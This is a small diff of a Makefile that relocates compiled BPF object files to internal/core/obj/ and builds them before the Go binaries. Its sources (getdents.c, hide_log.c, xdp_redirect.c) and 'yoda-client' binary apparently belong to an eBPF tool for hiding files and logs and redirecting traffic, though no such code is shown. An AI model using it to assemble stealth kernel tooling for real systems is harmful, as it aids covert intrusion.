@@ -4,7 +4,7 @@ BPF_CFLAGS ?= -O2 -g -target bpf -D__TARGET_ARCH_x86 -I/usr/include/ -I.
 BPF_LDFLAGS ?=
 ## BPF sources
 BPF_SRCS = bpf/xdp_redirect.c bpf/getdents.c bpf/hide_log.c
-BPF_OBJS = bpf/xdp_redirect.o bpf/getdents.o bpf/hide_log.o
+BPF_OBJS = internal/core/obj/xdp_redirect.o internal/core/obj/getdents.o internal/core/obj/hide_log.o
 
 ## Go build variables
 GO ?= go
@@ -15,7 +15,7 @@ CLI_BIN = yoda-client
 .PHONY: all yoda cli bpf clean cert
 
 
-all: yoda cli bpf
+all: bpf yoda cli
 
 CERT_IP ?= 127.0.0.1
 
@@ -31,7 +31,7 @@ cli:
 
 bpf: $(BPF_OBJS)
 
-bpf/%.o: bpf/%.c
+internal/core/obj/%.o: bpf/%.c
 	$(BPF_CLANG) $(BPF_CFLAGS) -c $< -o $@
 
 clean:
